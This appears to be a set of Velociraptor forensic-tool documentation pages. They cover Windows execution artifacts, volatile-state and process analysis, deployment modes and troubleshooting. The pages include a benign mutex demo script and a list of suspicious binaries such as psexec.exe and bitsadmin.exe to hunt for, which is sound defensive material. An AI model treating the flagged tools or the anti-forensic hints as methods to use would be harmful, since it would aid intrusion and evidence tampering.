Prefetch files’ name consist of the original binary and the [hash of the application path](https://www.symantec.com/connect/blogs/prefetch-analysis-live-response). Velociraptor has a built in Prefetch file parser, that allows extracting more information from the files themselves.

Prefetch files contain the following data (In recent Windows 10)
* The last 8 times the binary was run
* The number of times the binary was run
* The binary name
* The file size

## Prefetch tips

You can try to establish the original path of the executable by [brute forcing the hash](https://hiddenillusion.github.io/2016/05/10/go-prefetch-yourself/). Typically the full path of the binary is also encoded as one of the linked PE files.

Look for particularly suspicious binaries, eg sc.exe, xcopy.exe,
psexec.exe, bitsadmin.exe and particularly random looking binary
names.  Typically lower execution counts are more interesting

Even though the prefetch file itself only records 8 times of
execution, each time a binary is executed, the system will update the
prefetch file. It may be that other artifacts record this
interaction. In particular, the USN journal might record an
interaction with the prefetch file which is not recorded in the actual
prefetch file itself (because the binary was run more than 8 times or
the prefetch file was removed as an anti-forensic method).

Note too that the prefetch file creation time will record the time
when the program was **first** run, giving an additional timestamp to
consider.

## Prefetch timeline

The `Windows.Forensics.Prefetch` artifact shows all the execution
times for each file as an array. This is less useful as we normally
want to filter it by time of interest.  The
`Windows.Timeline.Prefetch` artifact is more useful for that as it
breaks records into distinct rows that can be easily filtered by
timestamps.

![Prefetch files](image10.png)

## Background Activity Moderator

BAM is a Windows service that Controls activity of background
applications.  This service exists in Windows 10 only after Fall
Creators update – [version 1709](https://www.andreafortuna.org/dfir/forensic-artifacts-evidences-of-program-execution-on-windows-systems/).

The service maintains binary data in the registry which keeps track on
the execution of different programs by the user. Velociraptor can
parse these timestamps using the `Windows.Forensics.Bam` artifact.

![BAM](image30.png)

{{% notice note %}}

The BAM artifact is stored in the registry under a key unique to the
user SID on the system, therefore it provides valuable attribution as
to who ran the binary (which Prefetch does not provide).

{{% /notice %}}

## Shim cache

Windows maintains a backward compatible set of tweaks to binaries
called “Shims”.  As part of this mechanism, there is a application
compatibility database stored in the registry key

`HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatibility\AppCompatCache`

You can read more about the Shim cache [here](https://www.fireeye.com/content/dam/fireeye-www/services/freeware/shimcache-whitepaper.pdf) or [here](http://www.alex-ionescu.com/?p=39) or [here](https://www.andreafortuna.org/2017/10/16/amcache-and-shimcache-in-forensic-analysis/).

The Shim cache database tracks the executables’ file name, file size and last modified time of the binary.

Velociraptor can parse the shim cache using the `Windows.Registry.AppCompatCache` artifact.

{{% notice note %}}
Note this is the modification time of the binary from the NTFS $STANDARD_INFORMATION stream, which might be replicated by the installer - so it might even be before the system was installed.
{{% /notice %}}

## Amcache

The Windows Application Experience Service tracks process creation
data in a registry file located in
`C:\Windows\AppCompat\Programs\Amcache.hve`

This tracks the first execution of a program on the system, including
programs executed from an external storage. You can investigate the
Amcache hive using the `Windows.System.Amcache` artifact.

Unlike the other registry based artifacts above, this registry hive is
not mounted and accessible via the Windows APIs - the service simply
uses the registry file format to store the information. We therefore
need to parse the raw registry hive file using the raw registry
accessor.

{{% notice note %}}

Note the key location is a URL - Velociraptor uses URL notation to
access raw registry hives as described [here]({{< ref "/docs/forensic/filesystem#raw-registry-parsing" >}}). This one uses
the ntfs file accessor to access the raw hive data since it is usually
locked at runtime.

{{% /notice %}}

## System Resource Usage Monitor (SRUM)

Windows keeps a running count of application metrics using SRUM in
order to power the "App history" tab in the task manager.

![SRUM](image12.png)

Metrics are stored in an ESE database at the location `%windir%\System32\sru\SRUDB.dat`. You can read more about the SRUM [here](https://www.velocidex.com/blog/medium/2019-12-31_digging-into-the-system-resource-usage-monitor-srum-afbadb1a375/).

You can examine the ESE database manually using Nirsoft [ESEDatabaseViewer](https://www.nirsoft.net/utils/ese_database_view.html).

![SRUM](image16.png)

The database contains multiple tables named after the GUID of the SRUM
extension that is recording data. While not all tables are fully
understood or documented it is sometimes possible to work out what
information is recorded by simple inspection of the database tables.

Velociraptor already knows how to interpret some of the providers:

* `{D10CA2FE-6FCF-4F6D-848E-B2E99266FA89}` is for application resource usage.
* `{DD6636C4-8929-4683-974E-22C046A43763}` is for network connection stats

You can collect the SRUM database using the `Windows.Forensics.SRUM`
artifact. The artifact contains several sources, each attempting to
interpret a different provider table.

---END OF FILE---

======
FILE: /content/docs/forensic/volatile/_index.md
======
---
menutitle: "Volatile State"
title: "Volatile machine state"
date: 2021-06-27T04:35:23Z
draft: false
weight: 90
---

Traditional forensic analysis relies on filesystem artifacts. However,
one of the best advantages of performing live response is the ability
to access the live system's state and uncover volatile indicators that
only exist briefly and might change in future.

{{% notice note "Memory analysis and Velociraptor" %}}

Traditionally volatile evidence was acquired using a full memory dump
of the running system, and then using a number of memory analysis
frameworks to extract some of the types of forensic artifacts we
discuss in this page.

While memory analysis is a sometimes useful technique, it is
notoriously unreliable due to issues such as smear, stability and
analysis shortfalls due to changing OS and application code.

An important principle of volatile system analysis is to disturb the
system as little as possible, to avoid increasing the rate at which
the volatile evidence might change. A full memory acquisition defeats
this requirement by causing a very large amount of data to be written
and potentially transferred over the network. Some server class
machines (or even high end workstations) currently contain so much
memory that full acquisition is actually not practical (e.g. upwards
of 64Gb of RAM is not uncommon), and produces significant amounts of
smear.

Velociraptor's approach is to use the relevant APIs to acquire
volatile artifacts as much as possible, so the acquisition can be made
quickly, accurately and with minimal endpoint impact. Velociraptor
tries to maintain the same names for the common plugins used by
popular memory analysis tools like Volatility, but gets the same
information using APIs (e.g. Velociraptor's plugins are named
`pslist`, `vad`, `mutants` etc and parallel Volatility's plugins of
the same name).

{{% /notice %}}

## Windows Management Instrumentation (WMI)

One of the earliest mechanisms for introspecting a machine's internal
state is using WMI. WMI provides a simple query language similar to
SQL called WQL (WMI Query Language). In WQL, a "table" is referred to
as a "class" and Windows provides a large number of classes organized
into namespaces.

It is most instructive to explore these using a tool such as [wmie2](https://github.com/vinaypamnani/wmie2).

![Exploring WMI with WMIE2](image39.png)

VQL provides direct access to WMI via the `wmi()` plugin. The plugin
simply takes a `query` parameter which is passed to WMI and the
results are emitted from the plugin one row at a time.

```sql
SELECT * FROM wmi(query="SELECT * FROM Win32_DiskDrive")
```

There are many providers in WMI and it is possible to gather a lot of
information about the system's current configuration and state in this
way. Use a tool such as `wmie2` to figure out interesting providers
and structure VQL queries around these. Note that with VQL you are
also able to combine functions like `upload()`, `hash()` and others to
further enrich the output from WMI providers.

## Mutants

Malware typically need to persist using multiple persistence
mechanisms - in case one mechanism is detected and removed, often
other mechanisms will re-infect the machine. This leaves a common
problem: How to avoid multiple copies of the same malware from
running?

A common solution is using a `Mutant` or a named mutex object. A
Mutant is a named kernel object that can only be "acquired" by one
thread at a time. Multiple copies of the same malware will try to
acquire the mutant, but only the first will succeed, leaving the rest
to exit.

For this reason, a mutant is frequently used as an indicator for a
malware strain because it is easy to see if the mutant name exists on
a system.

### Exercise - Mutants

For example, consider the following powershell snippet:

```powershell
$createdNew = $False
$mutex = New-Object -TypeName System.Threading.Mutex(
      $true, "Global\MyBadMutex", [ref]$createdNew)
if ($createdNew) {
    echo "Acquired Mutex"
    sleep(1000)
} else {
    echo "Someone else has the mutex"
}
```

The first time it is run, the mutant will be "acquired" and the
program will simply go to sleep. Further instances of the script will
be unable to acquire the mutant and will exit immediately.

### Enumerate the mutants

You can enumerate the mutant using the `Windows.Detection.Mutants`
artifact. This artifact can be used to collect all mutants (and
perhaps do some analysis on their names) or to check for some well
known names using a filter (in which case a hit represents a strong
signal that endpoint is compromised).

![Listing mutants](image35.png)

## Process analysis

A process is a user space task with a specific virtual memory
layout. A process has a name, Process ID (Pid), an initial binary on
disk, an ACL Token, environment variables etc. All of these associated
attributes can be used to explain why the process is launched and what
its intentions are.

Velociraptor provides access to various process attributes using
process specific plugins. Most of these plugins accept a `pid`
argument to examine a specific process.


### pslist

A simple `pslist()` can reveal basic information about the process:

* Who launched the binary? (Username and SID)
* Transfer metrics (network/disk activity)
* Is it elevated?
* Process Creation time
* Executable location on disk
* Commandline for launching the process.

![Process listing with the pslist() plugin](image38.png)

### Process Call chain

A process call chain is useful to see which process launched which
other process. Artifacts such as `Windows.System.Pstree` attempt to
put processes in a parent/child relationship (i.e. Process chain) to
try to visualize the order of process execution.

![Identifying process call chains](image40.png)


{{% notice warning "Shortfalls of process call chain tracing" %}}

Currently the process chain reassembly is susceptible to some
shortfalls:

1. Since the chain uses `pslist()` to populate its tree, processes who
   are exited will break the chain (because there will be no parent
   shown for one process in the chain).

2. Windows parent/child relationship can be easily [spoofed by
   malware](https://attack.mitre.org/techniques/T1134/004/) and can be
   mis-reported by the pslist() plugin.

{{% /notice %}}

### Example - Find elevated command shell

Write an artifact to find all currently running elevated command shells

```sql
SELECT * FROM pslist()
WHERE TokenIsElevated
```

## Mapped Memory

When a binary runs it links many DLLs into it in order to call
functions from these dlls. A linked DLL is a copy on write memory
mapping of a file on disk into the process memory space. DLLs can be
linked when the program starts or dynamically at runtime.

Seeing which DLL is linked gives a clue of the type of functionality
that a process is likely to use.

The `vad()` plugin shows all the process memory regions and if the
memory is mapped to file, the filename it is mapped from.

For interpreted languages like .net assemblies, powershell or python DLLs are mapped into the process at runtime when the script imports certain functionality. We can use this to get an idea of what the program is doing.

### Exercise - what is that powershell doing?

Without enabling powershell block logging, we can get an idea of what the script is doing by looking at its dependencies.

Consider a powershell script that runs `Invoke-WebRequest -Uri
"https://www.google.com" -UseBasicParsing` to download a page from the
internet. By virtue of this command, the powershell process will link
`winhttp.dll`.

We can write VQL to list all the DLL modules that powershell is running.

```sql
LET processes = SELECT Exe, CommandLine, Pid
FROM pslist()
WHERE Exe =~ 'PowerShell'

SELECT * FROM foreach(row=processes,
query={
   SELECT Exe, CommandLine, Pid, MappingName
   FROM vad(pid=Pid)
   GROUP BY MappingName
})
WHERE MappingName =~ 'winhttp'
```

---END OF FILE---

======
FILE: /content/docs/deployment/_index.md
======
---
menutitle: "Deployment"
title: "Deployment Overview"
date: 2021-06-09T03:52:24Z
last_reviewed: 2025-02-27
draft: false
weight: 10
---

Velociraptor offers many deployment options that allow us to operate in all
kinds of environments.

There really is no single "right" way to use Velociraptor, so in this section
we'll describe the commonly used (and therefore recommended) deployment modes.
We'll guide you through the main decisions that you'll need to make, and point
you to additional resources for less commonly used features and options.

If you just want to get a simple deployment up and running then please see our
[Quickstart Guide]({{< ref "/docs/deployment/quickstart/" >}}).

If you're really in a hurry you can start a self-contained
[Instant Velociraptor](#instant-velociraptor)
on your local machine which will allow you to experiment and get a feel for how
Velociraptor works.

{{% notice tip "Using Velociraptor integrated with Rapid7 InsightIDR?"%}}

These deployment steps apply to open source Velociraptor only. Read the
[InsightIDR documentation](https://docs.rapid7.com/insightidr/velociraptor-integration)
to learn more about how Velociraptor is deployed with the Rapid7 Insight Platform.

{{% /notice %}}

## Typical Deployment

![A typical Velociraptor deployment](overview.png)

We use the following terminology for Velociraptor's main components:

1. A **Client** is an instance of Velociraptor running on the endpoint, that is
   it's our endpoint "agent".
2. The **Frontend** is the server component that communicates with the client.
3. The **GUI** is the web application server that provides the administrative
   interface.
4. The **API** is our gRPC-based API server.

Each deployment relies on a unique **configuration file**, which include
information such as connection URLs, DNS names, and unique cryptographic keys.
Since key material is unique to each deployment, one Velociraptor deployment
cannot connect with another deployment.

The **Velociraptor Server** is typically deployed on a cloud VM and runs a
number of components as separate threads. The server provides an Admin UI - a Web
application that can be used to control Velociraptor and orchestrate hunts and
collections from the endpoints.

The endpoints themselves run the **Velociraptor Client**, typically installed as
a service. Velociraptor Clients maintain a persistent connection with the
server. This allows the client to execute tasks issued by the server in
near-realtime. Many other solutions rely on periodic polling between endpoint
and the server leading to latency between issuing a new task and receiving the
results - not so with Velociraptor!

Velociraptor does not use any external database - all data is stored within
the server’s filesystem in regular files and directories. This makes backups and
data lifecycle management a breeze. You do not need any additional
infrastructure such as databases or cloud storage services. Due to it's
file-oriented design, Velociraptor is compatible with distributed file systems
such as Amazon EFS, Google Filestore or generic NFS.

A typical deployment includes the following steps:

1. Plan your deployment and generate a configuration file for the server which
   includes the main configuration options.
2. Create a server installation package that includes the generated
   configuration file.
3. Set up a VM or a physical server to host the server component.
4. Install the server package. Once installed you will be able to access the
   Admin GUI and front end.
5. Create client installation packages for your target operating systems (for
   example, MSI for windows).
6. Deploy the client installation packages using your preferred deployment
   solution.


## Deployment Platforms

Velociraptor only has one binary per operating system + architecture
combination. We do not have separate client binaries and server binaries. The
binary can act as a server, a client or a number of utility programs depending
on the command line parameters passed to it.

While this technically allows you to run the server or the client on any
platform that we have a binary for,
_please note that the server is only fully supported on Linux_.
This is mainly due to performance considerations inherent in other platforms
such as Windows. However for non-production deployments - for example
evaluation, development or testing - it might be convenient for you to run the
server on a different platform, and you may decide to do so, but please keep in
mind that for production deployments the server should run on Linux. Issues with
other platforms will receive limited support.

Binaries for the the most common platforms and architectures are available on
our [Downloads]({{< ref "/downloads/" >}}) page.

## Deployment Milestones

At a high level, deploying Velociraptor consists of 3 tasks: setting up a
server, deploying clients, and granting user access to the server's web UI.

**Task 1: Deploy a Server**
- [Choose the deployment options]({{< ref "/docs/deployment/server#key-deployment-decisions" >}}) that
  work best for you and install your server.

**Task 2: Authorize Users**
- Grant users access to the Velociraptor server's web UI

**Task 3: Deploy Clients**
- [Deploy clients]({{< ref "/docs/deployment/clients/" >}}) on your endpoints
  using one or possibly a combination of the following methods:
  - Run clients interactively
  - Install the client as a service using a custom installer package
  - Agentless Deployment
  - Create and run "offline collectors" (which are essentially out-of-band clients)


## Other ways to use Velociraptor

While deploying Velociraptor in client-server mode, as described above, is the
recommended deployment model and typical of most deployments, Velociraptor's
extensive capabilities can also be used in innovative and unconventional ways -
even ones we haven't thought of yet!

There isn't a single prescribed way to use Velociraptor. We would love to hear
about your creative ideas and unusual use cases so we can continue to make
Velociraptor better for everyone.

The following are some other (less conventional) ways that you can use
Velociraptor.

### "Instant Velociraptor"

If you want to instantly start a Velociraptor instance for evaluation, learning,
experimentation, testing, or any another reason, you can run "Instant
Velociraptor". This is a fully functional, self-contained Velociraptor system on
to your local machine. In this mode of operation you'll get the server plus a
single client running within the same process on your machine. All the necessary
configuration is taken care of automatically. With a single command you can be
ready to dive right into the fun stuff!

To do this, download the Velociraptor executable for your
platform from the [Downloads page](/downloads/) and run the `gui` CLI command.

{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor gui
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe gui
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor gui
```
{{% /tab %}}
{{< /tabs >}}

Since this mode is not intended to be a production server, it is fine to run
this on any platform. The client capabilities do vary per platform, but the
server component is identical across platforms. This mode is especially
useful for testing and artifact development because it allows you to run VQL
directly on the target operating system via
[Velociraptor notebooks]({{< ref "/docs/notebooks/" >}}).

In this mode:

* The server only listens on the local loopback interface.
* The client connects to the server over the loopback.
* A data store directory is set to the user’s temp folder, unless specified
  otherwise (see note below).
* A single administrator user is created with the username `admin` and password
  `password`.
* The default web browser is launched with those credentials to connect to the GUI.

![Instant mode automatically enrolls a single client](gui_windows.svg)

{{% notice info "Instant Velociraptor: Persisting your data" %}}

By default the `gui` command uses the temp folder as it's data store (by default
a subfolder named `gui_datastore`). The `gui` command also automatically creates
new server and client configuration files in this datastore folder. This allows
you to re-run the `gui` command and get the same working environment with
persistent data.

However some operating systems clean out the temp folder periodically or during
a system reboot, in which case your environment and data will NOT persist (i.e.
it will be lost). To avoid this you can specify a different data store directory
using the `--datastore` flag and point it to a location where your data will be
persisted. If at any time you want to start with a fresh instance you can either
delete the old datastore folder or point it to a new folder using the
`--datastore` flag.

{{% /notice %}}


### Command line investigation tool

We can run any VQL query or any Velociraptor artifacts from the CLI and
optionally write the results to local files. Using this capability it's possible
to use Velociraptor as a command line DFIR "Swiss Army Knife" or build it into
forensic data processing pipelines.

Most CLI-based forensics tools perform a specific, limited set of functions.
However with Velociraptor's CLI you have full access to VQL and all the
functions and plugins that Velociraptor provides. So this capability can be used
to inspect a live system or analyze acquired file-based forensic artifacts, for
example Sqlite databases or event logs.

The CLI provides the following commands which support this mode of operation:

**The query command**

The `query` command accepts any VQL query and runs it against the local system.
The results can optionally be written to file in a variety of formats.

Example:

```
velociraptor.exe query "SELECT * FROM pslist()" --format jsonl --output pslist.json
```


**The artifacts command**

The `artifacts collect` command runs any [Velociraptor artifact]({{< ref "/docs/artifacts/" >}})
which can contain one or more packaged VQL queries.

You can use `artifacts list` to list the available artifacts, and
`artifacts show` to view the contents of a specific artifact.

```txt
  artifacts
    list [<flags>] [<regex>]
    show <name>
    collect [<flags>] <artifact_name>...
```

All the built-in Velociraptor artifacts are available within the binary.

Custom artifacts can be used too by pointing the binary to a folder containing
these artifacts using the `--definitions` flag.

As with the `query` command, the results can optionally be written to file in a
variety of formats.

Examples:

```txt
velociraptor.exe artifacts list ".*Audit.*"
Server.Audit.Logs
Windows.System.AuditPolicy
```

```txt
velociraptor.exe artifacts show "Windows.System.AuditPolicy"
name: Windows.System.AuditPolicy

description: |
   Artifact using auditpol to retrieve the logging settings
   defined in the Windows Audit Policy.

   Use this artifact to determine what Windows event logs are audited
   and if there are any discrepancies across the environment.

type: CLIENT
...
```

```txt
velociraptor.exe artifacts collect "Windows.System.AuditPolicy" --format json --output auditpol.json
```


### "Instant Velociraptor" as a local investigation tool

While [Instant Velociraptor]({{< relref "#instant-velociraptor" >}}) is normally
used for testing or demonstrations, it can actually be used as a standalone
GUI-based forensic tool.

The `gui` command starts the server and a single client within a single process.
This client is no different from one that's separately deployed, and can be used
to interrogate the local system as you would do for any remote client.

{{% notice warning "Minimizing data pollution"%}}

Obviously this idea is not suitable for all investigation scenarios as the
server component will need to write data to it's datastore. Also, using a web
browser on the target machine and any other activity risks polluting the
forensic data. If these risks are acceptable to you, you may still want to
minimize them by:
- locating the datastore on an external drive using the `--datastore` flag.
- changing the writeback and tempdir locations in the client config to also be
  on an external drive.

{{% /notice %}}

### "Instant Velociraptor" as an desktop environment for analysts

[Instant Velociraptor]({{< relref "#instant-velociraptor" >}}) can also be used
as a standalone graphical forensic desktop environment, for acquired forensic
artifacts.

[Velociraptor notebooks]({{< ref "/docs/notebooks/" >}}) have access to the
local filesystem, and can therefore read any files within it and work with the
extracted data.

In addition to forensic artifacts you can also read the most common text-based
file formats, for example json or csv, and then work with that data in the
notebook interface. In this way Velociraptor notebooks can function very
similarly to [Jupyter notebooks](https://docs.jupyter.org/en/latest/) with the
[Python Pandas](https://pandas.pydata.org/docs/user_guide/10min.html) library,
which were indeed a significant inspiration for Velociraptor notebooks.
In this mode of operation, the client component may not be needed and you can
disable it by adding the `--no-client` flag to the `gui` command.

However the client component may be useful if you want to use
[remapping]({{< ref "/docs/forensic/filesystem/remapping/" >}}) which will allow
you to inspect and analyze disk image files using Velociraptor's dead disk
feature. The `gui` command creates the client config file in the datastore
folder, to which you can add the remapping config, if needed.

### Standalone offline collectors

[Offline collectors]({{< ref "/docs/offline_triage/#offline-collections" >}})
are usually created with the expectation that the data will be imported into a
Velociraptor server, but this doesn't have to be the case. You may just be
interested in extracting the data and working with it elsewhere using other
tools. In that case the only reason for having a Velociraptor server is to
create the offline collector, and you can use an
[Instant Velociraptor]({{< relref "#instant-velociraptor" >}}) for that purpose.

It's important to note that Velociraptor offline collectors have all the
capabilities of a normal Velociraptor client. _They are not limited to doing
file acquisition!_ You can run any Velociraptor artifact, including custom ones,
and the results are written to jsonl formatted files (and/or CSV format, if
you prefer) which can be read by most data processing tools.

As a variation on this idea, you can import the offline collection archives back
into the standalone (i.e. non-networked) Instant Velociraptor, and work with
them the same as you would with data collected from network-connected clients.
That is, an Instant Velociraptor deployment using only offline collectors
amounts to a sneakernet Velociraptor deployment!

<!-- ### Sneakernet Velociraptor server

### Ephemeral clients -->

## What's next?

{{% children "description"=true %}}

---END OF FILE---

======
FILE: /content/docs/deployment/troubleshooting/_index.md
======
---
title: Troubleshooting and Debugging
menutitle: Troubleshooting
weight: 100
summary: |
  Sometimes things don’t work when you first try them. This page will go through
  the common issues encountered when deploying Velociraptor clients, and the
  steps needed to debug them.
---

## Troubleshooting deployments

Sometimes things don't work when you first try them. This page will go
through the common issues people find when deploying Velociraptor
clients and the steps needed to debug them.

### Server fails to start

If the server fails to start, you can try to start it by hand to see
any logs or issues. Typically the Linux service will report something
unhelpful such as:

```
# service velociraptor_server status
● velociraptor_server.service - Velociraptor linux amd64
    Loaded: loaded (/etc/systemd/system/velociraptor_server.service; enabled; vendor preset: enabled)
    Active: activating (auto-restart) (Result: exit-code) since Fri 2021-12-31 15:32:58 AEST; 1min 1s ago
   Process: 3561364 ExecStart=/usr/local/bin/velociraptor --config /etc/velociraptor/server.config.yaml frontend (code=exited, status=1/FAILURE)
  Main PID: 3561364 (code=exited, status=1/FAILURE)
```

You can usually get more information from the system log files,
usually `/var/log/syslog`. Alternative you can try to start the
service by hand and see any issues on the console.

First change to the Velociraptor user and then start the service as that user.

```
# sudo -u velociraptor bash
$ velociraptor frontend -v
Dec 31 15:47:18 devbox velociraptor[3572509]: velociraptor.bin: error: frontend: loading config file: failed to acquire target io.Writer: failed to create a new file /mnt/data/logs/Velociraptor_debug.log.202112270000: failed to open file /mnt/data/logs/Velociraptor_debug.log.202112270000: open /mnt/data/logs/Velociraptor_debug.log.202112270000: permission denied
```

In this case, Velociraptor can not start because it can not write on
its logs directory. Other errors might be disk full or various
permission denied problems.

{{% notice warning "Incorrect permissions in the filestore" %}}

Because Velociraptor normally runs as a low privileged user, it needs
to maintain file ownership as the `velociraptor` user. Sometimes
permissions change by accident (usually this happens by running
velociraptor as root and interacting with the file store - you should
**always** change to the `velociraptor` user before interacting with
the server).

It is worth checking file permissions (using `ls -l`) and recursively
returning file ownership back to the `velociraptor` user (using the
command `chown -R velociraptor:velociraptor /path/to/filestore/`)

{{% /notice %}}

### Debugging client communications

If the client does not appear to properly connect to the server, the
first thing is to run it manually (using the `velociraptor --config
client.config.yaml client -v` command):

![Running the client manually](1TOeyrCcX69mtUdO8E4ZK9g.png)

In the above example, I ran the client manually with the -v switch. I
see the client starting up and immediately trying to connect to its
URL (in this case `https://test.velocidex-training.com/`) However
this fails and the client will wait for a short time before retrying
to connect again.

![Testing connectivity with curl](1IzCgKdN28sjntuxd9mUJew.png)

A common problem here is network filtering making it impossible to
reach the server. You can test this by simply running curl with the
server’s URL.

Once you enable connectivity, you might encounter another problem

![Captive portal interception](1p3MPNfTbXBzNMs-X4yv4SA.png)

The **Unable to parse PEM** message indicates that the client is
trying to fetch the **server.pem** file but it is not able to validate
it. This often happens with captive portal type of proxies which
interfere with the data transferred. It can also happen if your DNS
setting point to a completely different server.

We can verify the **server.pem** manually by using curl (note that
when using self-signed mode you might need to provide curl with the -k
flag to ignore the certificate errors):

![Fetching the server certificate](1P9W4CnX9qNLGiRgnHGyLAw.png)

Note that the **server.pem** is always signed by the velociraptor
internal CA in all deployment modes (even with lets encrypt). You can
view the certificate details by using openssl:

```bash
curl https://test.velocidex-training.com/server.pem | openssl x509 -text
```

If your server certificate has expired, the client will refuse to
connect to it. To reissue the server certificate simply recreate the
server configuration file (after suitably backing up the previous
config file):

```bash
velociraptor config reissue_certs --validity 365 --config server.config.yaml > new_server.config.yaml
```

Depending on which user invoked the Velociraptor binary, you may need
to alter the permissions of the new server configuration file.

For example:

```bash
chmod 600 new_server.config.yaml
chown velociraptor:velociraptor new_server.config.yaml
```

From here, you will need to move the updated server configuration into
the appropriate location.

{{% notice warning "CA certificate expiry" %}}

The above step was able to use the internal Velociraptor CA to reissue
the server certificate (which is normally issued for 1 year), allowing
us to rotate the certificate.

Currently there is no way to update the CA certificate without
redeploying new clients (the CA certificate is embedded in the client
config file). When generating the config file initially, the CA
certificate is created with a 10 year validity.

{{% /notice %}}

## Debugging Velociraptor

Velociraptor is a powerful program with a lot of
functionality. Sometimes it is important to find out what is happening
inside Velociraptor and if it doing what is expected. This is
important for debugging or even just for understanding what is
happening.

To see the inner workings of Velociraptor we can collect `profiles` of
various aspects of the program. These profiles exist regardless of if
Velociraptor is used in as a client or server or even an offline
collector.

You can read more about profiling in [Profiling the Beast]({{% ref "/blog/2020/2020-08-16-profiling-the-beast-58913437fd16/" %}})

### Starting the debug server

When provided with the `--debug` flag, Velociraptor will start the
debug server on port 6060 (use `--debug_port` to change it). By
default the debug server will only bind to localhost so you will need
to either tunnel the port or use a local browser to connect to it.

![Viewing the debug server](debug_server.png)

The debug server has a number of different profiles and new ones will
be introduced, so below we just cover some of the most useful profiles
you can view.

#### Notebook workers

Notebooks are very useful feature of the server allowing for complex
postprocessing of collected data. Sometimes these queries are very
large and take a long time to run. To limit the amount of resources
the queries can take on the server, Velociraptor only creates a
limited number of notebook workers (by default 5).

![Inspecting the notebook workers](notebook_workers.png)

#### Currently running queries

This view shows the queries currently running in this process. For
example queries will run as part of the notebook evaluation, currently
installed event queries or in the case of the offline collector,
currently collecting artifacts.

![Inspecting the currently running queries](currently_running_queries.png)

You can also see all recent queries (even the ones that have completed
already). This helps to understand what exactly the client is doing.

#### ETW Subsystem

This profile shows the current state of the ETW subsystem on
Windows. We can see what providers Velociraptor is subscribed to, how
many queries are currently watching that provider, and how many events
were received from the provider.

![Inspecting the ETW subsystem](etw_profile.png)


#### Go profiling information

For even more low level view of the program execution, we can view the
`Built in Go Profiles` which include detailed heap allocation,
goroutine information and can capture a CPU profile for closer
inspection.

This type of information is critical for developers to understand what
the code is doing, and you should forward it in any bug reports or
discussions to help the Velociraptor developer team.

### Debugging the offline collector

The offline collector is a one shot collector which simply runs,
collects several preconfigured artifacts into a zip file and
terminates.

Sometimes the collector may take a long time or use too much
memory. In this case you might want to gain visibility into what its
doing.

You can start the offline collector by adding the `--debug` flags to
its execution in a similar way to above.

```sh
Collector_velociraptor-v0.74.1-windows-amd64.exe -- --debug --debug_port 6061
```

![Inspecting the ETW subsystem](debugging_offline_collector.png)

Note that the additional `--` is required to indicate that the
additional parameters are not considered part of the command line (the
offline collector requires running with no parameters).

The above will start the debug server on port 6061. You can then
download goroutine, heap allocation and other profiles from the debug
server and forward these to the Velociraptor team to resolve any issues.


### Debugging the server

It is also possible to collect the profile from the server without the
use of the `--debug` flag using the `Server.Monitor.Profile`
artifact. This is the server equivalent of the
`Generic.Client.Profile` artifact.

### Collecting metrics

When Velociraptor is run in production it is often necessary to build
dashboards to monitor the server's characteristics, such as memory
user, requests per second etc.

Velociraptor exports a lot of important metrics using the standard
`Prometheus` library. This information may be scraped from the
server's monitoring port (by default
http://127.0.0.1:8003/metrics). You can change the port and bind
address for the metrics server using the [Monitoring.bind_port
]({{% ref "/docs/deployment/references/#Monitoring.bind_port" %}}) and [Monitoring.bind_address
]({{% ref "/docs/deployment/references/#Monitoring.bind_address" %}}) setting.

You can either manually see program metrics using curl or configure an
external system like [Grafana](https://grafana.com/) or
[DataDog](https://www.datadoghq.com/) to scrape these metrics.

```
curl http://127.0.0.1:8003/metrics | less
```

We recommend that proper monitoring be implemented in production systems.

---END OF FILE---

======
FILE: /content/docs/deployment/clients/_index.md
======
---
title: Deploying Clients
weight: 25
last_reviewed: 2024-11-30
summary: |
  How to run, and optionally install, clients on the most common platforms.
---

We refer to Velociraptor endpoint agents as **clients**.

Clients connect to the server and wait for instructions, which mostly consist of
VQL queries. They then run the VQL queries assigned to them by the server and
return the results to the server.

On this page we explain how to run, and optionally install, clients on the most
common platforms. There is no single "correct" way to deploy and use
Velociraptor so here we also try to highlight the pros and cons of the most
common approaches.

{{% notice note "Velociraptor Binaries" %}}

**Velociraptor only has one binary per operating system and architecture.**

We don't have separate client binaries and server binaries. The command line
options tell the binary whether to behave as a server or as a client. Therefore
you can run the client on any platform and architecture that we have a binary
for.

For platforms and architectures where we don't have a binary you may still be
able to compile one yourself from source, provided that Golang supports the
target platform+architecture combination.

{{% /notice %}}

## Generating the client configuration file

There are several ways to run clients, depending on your needs. Ultimately
however this amounts to running the Velociraptor binary and providing it with a
**client configuration file**, which provides the client with cryptographic
material, connection information and other client-related settings.

We saw how to generate the server configuration file in the
[server deployment guide]({{< ref "/docs/deployment/server/#generate-the-configuration-file" >}}).
The client configuration is contained within the server configuration.

![Client config is a subset of the full config](client_config_yaml.svg)

When we "generate" a client config file we are effectively extracting the `Client`
section from the full config. If you are using the
[orgs]({{< ref "/docs/deployment/orgs/" >}})
feature then you will need a separate client config file for each org, since the
config also contains a `nonce` value that associates the client with a specific
org.

There are two ways to accomplish this task which we explain below:

1. Using the Admin GUI (recommended)
2. Using the command line

{{% notice tip "MSI repacking" %}}

If you are _only_ interested in Windows clients and will _only_ be creating MSI
installer packages, then the MSI repacking method described
[here]({{< relref "#option-1-using-the-velociraptor-gui" >}})
will use the client config for the current org. In that case you don't actually
need to download the client config file, although you may still want to read
this section to understand more about the topic of client config files.

{{% /notice %}}

#### Option 1: Obtaining the client config from the GUI

The simplest way of obtaining the client config file is to download it from the
GUI.

Navigate to the **Current Orgs** section on the **Home** screen and then click on
the file name to download the YAML file.

![Downloading client configs from the GUI](home_client_configs.svg)

The config files for each org contain the correct client `nonce` for connecting
to that org.

#### Option 2: Obtaining the client config on the command line

The client config can also be obtained using the CLI. Although this is not the
preferred way, it is useful in some situations such as automated build
environments.

{{< tabs >}}
{{% tab name="Linux" %}}
```shell
./velociraptor config client --org "root" --config server.config.yaml > client.root.config.yaml
```
{{% /tab %}}
{{% tab name="Windows" %}}
```shell
velociraptor.exe config client --org "root" --config server.config.yaml > client.root.config.yaml
```
{{% /tab %}}
{{% tab name="macOS" %}}
```shell
./velociraptor config client --org "root" --config server.config.yaml > client.root.config.yaml
```
{{% /tab %}}
{{< /tabs >}}

This command reads the datastore location from the config specified in the
`--config` flag, and for non-root orgs these orgs must already exist in the
datastore.

Note that the `--org` flag expects the Org ID, not the org name. If the `--org`
